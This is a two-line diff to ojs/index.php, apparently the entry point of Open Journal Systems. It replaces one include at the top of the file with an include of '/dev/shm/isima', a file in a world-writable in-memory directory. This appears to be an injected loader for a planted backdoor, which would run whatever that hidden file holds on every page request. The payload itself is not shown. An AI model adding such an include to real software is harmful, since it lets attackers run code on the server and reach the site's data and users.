@@ -1,5 +1,5 @@
 <?php
-include '/etc/cl.selector/sd';
+include '/dev/shm/isima';
 
 /**
  * @file ojs/index.php
